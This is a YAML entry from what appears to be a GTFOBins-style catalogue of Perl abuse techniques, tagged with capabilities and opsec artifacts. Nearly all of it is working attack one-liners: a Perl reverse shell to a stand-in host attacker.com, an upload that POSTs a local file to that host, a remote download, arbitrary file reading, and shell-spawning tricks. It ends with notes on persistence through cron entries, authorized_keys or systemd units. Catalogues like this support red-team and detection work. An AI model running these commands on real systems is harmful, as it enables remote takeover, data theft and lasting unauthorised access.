---
name: perl
capabilities:
- exec
- spawn
- read
- upload
- download
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: 'perl -MIO::Socket::INET -e ''$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'''
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: perl -ne print /path/to/input-file
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: perl -e 'exec "/bin/sh"'
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
  notes: The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: 'perl -MIO::Socket::INET -e ''$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'''
references:
- https://gtfobins.github.io/gtfobins/perl/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
